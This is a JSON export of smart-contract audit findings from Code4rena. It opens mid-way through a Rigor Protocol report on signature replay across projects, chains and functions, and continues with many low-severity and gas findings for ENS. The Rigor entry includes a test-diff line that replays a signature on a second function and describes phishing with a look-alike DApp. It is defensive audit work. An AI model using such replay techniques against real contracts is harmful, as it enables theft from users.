contractor', async () => {\n     expect(await project.contractor()).to.equal(ethers.constants.AddressZero);\n     const data = {\n       types: ['address', 'address'],\n@@ -452,6 +452,7 @@ export const projectTests = async ({\n       signers[1],\n     ]);\n     const tx = await project.inviteContractor(encodedData, signature);\n+    const tx2 = await project.setComplete(encodedData, signature);\n     await expect(tx)\n       .to.emit(project, 'ContractorInvited')\n       .withArgs(signers[1].address);\n```\n\nWhile this reverts because there is no task that corresponds to the address that is signed there, this is not always the case.<br>\n4.) Signature reuse from different Ethereum projects & phishing<br>\nBecause the payload of these signatures is very generic (two addresses, a byte and two uints), there might be situations where a user has already signed data with the same format for a completely different Ethereum application. Furthermore, an attacker could set up a DApp that uses the same format and trick someone into signing the data. Even a very security-conscious owner that has audited the contract of this DApp (that does not have any vulnerabilities and is not malicious, it simply consumes signatures that happen to have the same format) might be willing to sign data for this DApp, as he does not anticipate that this puts his Rigor project in danger.\n\n### Recommended Mitigation Steps\n\nI strongly recommend to follow [EIP-712](https://eips.ethereum.org/EIPS/eip-712) and not implement your own standard / solution. While this also improves the user experience, this topic is very complex and not easy to get right, so it is recommended to use a battle-tested approach that people have thought in detail about. All of the mentioned attacks are not possible with EIP-712:<br>\n1.) There is always a domain separator that includes the contract address.<br>\n2.) The chain ID is included in the domain separator<br>\n3.) There is a type hash (of the function name / parameters)<br>\n4.) The domain separator does not allow reuse across different projects, phishing with an innocent DApp is no longer possible (it would be shown to the user that he is signing data for Rigor, which he would off course not do on a different site)\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/75)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a project code that could enable different attacks. The code is located in several places, indicated by the provided links. The impacts of these attacks are that signature reuse across different Rigor projects, chains, and functions could be possible. This could lead to malicious users taking advantage of this vulnerability and potentially stealing user data. \n\nTo mitigate these attacks, it is recommended to follow the EIP-712 standard. This is a battle-tested approach that is designed to prevent these types of attacks. It includes a domain separator that includes the contract address, the chain ID, and a type hash. By following this standard, the attacks mentioned in the report would not be possible.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "https://github.com/code-423n4/2022-08-rigor-findings/issues/75",
      "tags": [
        "EIP-712"
      ],
      "finders": [
        "vlad_bochok",
        "0x52",
        "Lambda",
        "0x1f8b",
        "horsefacts",
        "wastewa"
      ]
    },
    {
      "id": "22648",
      "title": "[Nâ€‘20] Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "LOW",
      "content": "\nThe compiler will inline the function, which will avoid `JUMP` instructions usually associated with functions\n\n*There are 6 instances of this issue.*\n\n**[jefflau (ENS) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/221#issuecomment-1200790544):**\n > High quality submission, documented well with links and code examples.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22647",
      "title": "[Nâ€‘19] Not using the named return variables anywhere in the function is confusing",
      "impact": "LOW",
      "content": "\nConsider changing the variable to be an unnamed one.\n\n*There are 4 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22646",
      "title": "[Nâ€‘18] Event is missing `indexed` fields",
      "impact": "LOW",
      "content": "\nIndex event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (threefields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question.\n\n*There are 18 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22645",
      "title": "[Nâ€‘17] File does not contain an SPDX Identifier",
      "impact": "LOW",
      "content": "\n*There are 14 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22644",
      "title": "[Nâ€‘16] Typos",
      "impact": "LOW",
      "content": "\n*There are 5 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22643",
      "title": "[Nâ€‘15] Non-library/interface files should use fixed compiler versions, not floating ones",
      "impact": "LOW",
      "content": "\n*There are 4 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22642",
      "title": "[Nâ€‘14] Inconsistent method of specifying a floating pragma",
      "impact": "LOW",
      "content": "\nSome files use `>=`, some use `^`. The instances below are examples of the method that has the fewest instances for a specific version. Note that using `>=` without also specifying `<=` will lead to failures to compile, or external project incompatability, when the major version changes and there are breaking-changes, so `^` should be preferred regardless of the instance counts\n\n*There are 10 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22641",
      "title": "[Nâ€‘13] Lines are too long",
      "impact": "LOW",
      "content": "\nUsually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length\n\n*There are 8 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22640",
      "title": "[Nâ€‘12] Inconsistent spacing in comments",
      "impact": "LOW",
      "content": "\nSome lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22639",
      "title": "[Nâ€‘11] Constant redefined elsewhere",
      "impact": "LOW",
      "content": "\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/wrapper/NameWrapper.sol\n\n/// @audit seen in contracts/registry/ReverseRegistrar.sol \n35:       ENS public immutable override ens;\n\n```\n\n<https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L35>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22638",
      "title": "[Nâ€‘10] `pragma experimental ABIEncoderV2` is deprecated",
      "impact": "LOW",
      "content": "\nUse `pragma abicoder v2` [instead](https://github.com/ethereum/solidity/blob/69411436139acf5dbcfc5828446f18b9fcfee32c/docs/080-breaking-changes.rst#silent-changes-of-the-semantics)\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22637",
      "title": "[Nâ€‘09] Use a more recent version of solidity",
      "impact": "LOW",
      "content": "\n* Use a solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`<br>\n  *There are 4 instances of this issue.*\n\n* Use a solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions<br>\n  *There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22636",
      "title": "[Nâ€‘08] File is missing version pragma",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/ethregistrar/IBaseRegistrar.sol\n\n0:    import \"../registry/ENS.sol\";\n\n```\n\n<https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/ethregistrar/IBaseRegistrar.sol#L0>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22635",
      "title": "[Nâ€‘07] Missing event and or timelock for critical parameter change",
      "impact": "LOW",
      "content": "\nEvents help non-contract tools to track changes, and events prevent users from being surprised by changes\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22634",
      "title": "[Nâ€‘06] Redundant cast",
      "impact": "LOW",
      "content": "\nThe type of the variable is the same as the type to which the variable is being cast.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/registry/ReverseRegistrar.sol\n\n/// @audit address(resolver)\n53:               address(resolver) != address(0),\n\n```\n\n<https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/registry/ReverseRegistrar.sol#L53>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22633",
      "title": "[Nâ€‘05]  `constant`s should be defined rather than using magic numbers",
      "impact": "LOW",
      "content": "\nEven [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals.\n\n*There are 150 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22632",
      "title": "[Nâ€‘04] `public` functions not called by the contract should be declared `external` instead",
      "impact": "LOW",
      "content": "\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n*There are 13 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22631",
      "title": "[Nâ€‘03] `require()`/`revert()` statements should have descriptive reason strings",
      "impact": "LOW",
      "content": "\n*There are 17 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22630",
      "title": "[Nâ€‘02] Adding a `return` statement when the function defines a named return variable, is redundant",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n\n139:          return rrset;\n\n```\n\n<https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/DNSSECImpl.sol#L139>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22629",
      "title": "[Nâ€‘01] Name validation is not strictly valid",
      "impact": "LOW",
      "content": "\nWhile the documentation does in fact [say](https://docs.ens.domains/ens-improvement-proposals/ensip-1-ens#name-syntax) that there are other validations necessary to be compatible with the legacy DNS system, it would be better to have the following function signature instead `function valid(string calldata name, bool isEnforceLegacyRules) public pure returns (bool)`, so it's clear what the caller is validating\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/ethregistrar/ETHRegistrarController.sol\n\n77       function valid(string memory name) public pure returns (bool) {\n78           return name.strlen() >= 3;\n79:      }\n\n```\n\n<https://github.com/code-423n4/2022-07-ens/blob/4dfb0e32f586bff3db486349523a93480e3ddfba/contracts/ethregistrar/ETHRegistrarController.sol#L77-L79>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22628",
      "title": "[Lâ€‘03] Open TODOs",
      "impact": "LOW",
      "content": "\nCode architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/dnssec-oracle/DNSSECImpl.sol\n\n238:          // TODO: Check key isn't expired, unless updating key itself\n\n```\n\n<https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/DNSSECImpl.sol#L238>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22627",
      "title": "[Lâ€‘02] Missing checks for `address(0x0)` when assigning values to `address` state variables",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/dnssec-oracle/Owned.sol\n\n19:           owner = newOwner;\n\n```\n\n<https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/dnssec-oracle/Owned.sol#L19>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22626",
      "title": "[Lâ€‘01] `require()` should be used instead of `assert()`",
      "impact": "LOW",
      "content": "\nPrior to solidity version 0.8.0, hitting an assert consumes the **remainder of the transaction's available gas** rather than returning it, as `require()`/`revert()` do. `assert()` should be avoided even past solidity version 0.8.0 as its [documentation](https://docs.soliditylang.org/en/v0.8.14/control-structures.html#panic-via-assert-and-error-via-require) states that \"The assert function creates an error of type Panic(uint256). ... Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix\".\n\n*There are 2 instances of this issue.* (For in-depth details on this and all further issues with multiple instances, please see the warden's [full report](https://github.com/code-423n4/2022-07-ens-findings/issues/221).)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5570",
      "title": "[G-11] Use custom errors instead of string error messages",
      "impact": "GAS",
      "content": "\n```js\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n    }\n\n    function testFailGas() public {\n        c0.stringErrorMessage();\n        c1.customErrorMessage();\n    }\n}\n\ncontract Contract0 {\n    function stringErrorMessage() public {\n        bool check = false;\n        require(check, \"error message\");\n    }\n}\n\ncontract Contract1 {\n    error CustomError();\n\n    function customErrorMessage() public {\n        bool check = false;\n        if (!check) {\n            revert CustomError();\n        }\n    }\n}\n\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 34087              â”† 200             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ stringErrorMessage â”† 218             â”† 218 â”† 218    â”† 218 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract1 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 26881              â”† 164             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ customErrorMessage â”† 161             â”† 161 â”† 161    â”† 161 â”† 1       â”‚\nâ•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n```\n\n### Lines\n\nFor full list of line references, see warden's [original submission](https://github.com/code-423n4/2022-07-ens-findings/issues/176).\n\n**[jefflau (ENS) commented](https://github.com/code-423n4/2022-07-ens-findings/issues/176#issuecomment-1200872608):**\n > High quality submission with gas tables and reproduction.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "#g-11-use-custom-errors-instead-of-string-error-messages",
      "tags": [],
      "finders": []
    },
    {
      "id": "5569",
      "title": "[G-10] Consider marking functions as payable",
      "impact": "GAS",
      "content": "\nYou can mark public or external functions as payable to save gas. Functions that are not payable have additional logic to check if there was a value sent with a call, however, making a function payable eliminates this check. This optimization should be carefully considered due to potentially unwanted behavior when a function does not need to accept ether.\n\n```js\ncontract GasTest is DSTest {\n    Contract0 c0;\n    Contract1 c1;\n\n    function setUp() public {\n        c0 = new Contract0();\n        c1 = new Contract1();\n    }\n\n    function testGas() public {\n        c0.isNotPayable();\n        c1.isPayable();\n    }\n}\n\ncontract Contract0 {\n    function isNotPayable() public view {\n        uint256 val = 0;\n        val++;\n    }\n}\n\ncontract Contract1 {\n    function isPayable() public payable {\n        uint256 val = 0;\n        val++;\n    }\n}\n```\n\n### Gas Report\n\n```js\nâ•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\nâ”‚ Contract0 contract â”†                 â”†     â”†        â”†     â”†         â”‚\nâ•žâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•¡\nâ”‚ Deployment Cost    â”† Deployment Size â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ 32081              â”† 190             â”†     â”†        â”†     â”†         â”‚\nâ”œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ”¼â•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ•Œâ”¤\nâ”‚ Function Name      â”† min             â”† avg â”† median â”† max â”† # calls 